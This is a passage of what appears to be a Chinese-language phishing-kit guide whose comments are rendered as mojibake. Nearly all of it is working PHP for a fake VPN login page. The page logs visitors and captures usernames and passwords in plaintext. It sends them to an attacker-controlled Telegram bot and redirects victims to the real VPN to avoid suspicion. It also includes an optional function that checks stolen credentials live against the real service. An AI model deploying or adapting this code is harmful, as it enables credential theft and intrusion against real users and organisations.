### 4.2 å‡­è¯æ”¶é›†é¡µé¢ï¼ˆæ ¸å¿ƒï¼‰

```php
<!-- phishing_pages/login_capture.php -->
<?php
// VPNç™»å½•é¡µé¢ - å‡­è¯æ”¶é›†
session_start();
error_reporting(0);

// é…ç½®
define('LOG_FILE', '/var/log/phish/credentials.txt');
define('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN');
define('TELEGRAM_CHAT_ID', 'YOUR_CHAT_ID');
define('REDIRECT_URL', 'https://vpn.example.com');  // çœŸå®VPNåœ°å€

// è®°å½•è®¿é—®
$visitor_info = [
    'time' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
    'tracking_token' => $_GET['token'] ?? 'none',
];

file_put_contents('/var/log/phish/visits.log', json_encode($visitor_info)."\n", FILE_APPEND);

// å¤„ç†ç™»å½•æäº¤
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // è®°å½•å‡­è¯
    $cred_log = [
        'time' => date('Y-m-d H:i:s'),
        'ip' => $_SERVER['REMOTE_ADDR'],
        'username' => $username,
        'password' => $password,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
        'tracking_token' => $_POST['token'] ?? $_GET['token'] ?? 'none',
    ];
    
    file_put_contents(LOG_FILE, json_encode($cred_log)."\n", FILE_APPEND);
    
    // Telegramå®æ—¶é€šçŸ¥
    send_telegram_alert($cred_log);
    
    // éªŒè¯å‡­è¯ï¼ˆå¯é€‰ - å®æ—¶éªŒè¯ï¼‰
    // $is_valid = verify_credentials($username, $password);
    
    // è·³è½¬åˆ°çœŸå®é¡µé¢ï¼ˆä¸å¼•èµ·æ€€ç–‘ï¼‰
    header("Location: " . REDIRECT_URL);
    exit;
}

function send_telegram_alert($data) {
    $message = "ğŸ£ æ–°é’“é±¼æˆåŠŸ!\n\n";
    $message .= "ğŸ‘¤ ç”¨æˆ·å: {$data['username']}\n";
    $message .= "ğŸ”‘ å¯†ç : {$data['password']}\n";
    $message .= "ğŸŒ IP: {$data['ip']}\n";
    $message .= "â° æ—¶é—´: {$data['time']}\n";
    $message .= "ğŸ” Token: {$data['tracking_token']}";
    
    $url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
    $post = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_exec($ch);
    curl_close($ch);
}

// å®æ—¶éªŒè¯å‡­è¯ï¼ˆå¯é€‰ï¼‰
function verify_credentials($username, $password) {
    // è¿™é‡Œå¯ä»¥å®ç°å¯¹çœŸå®VPNçš„éªŒè¯
    // è­¦å‘Š: å¯èƒ½è§¦å‘å‘Šè­¦ï¼Œè°¨æ…ä½¿ç”¨
    
    $vpn_url = "https://vpn.example.com/api/auth";
    $data = json_encode(['username' => $username, 'password' => $password]);
    
    $ch = curl_init($vpn_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $http_code === 200;
}
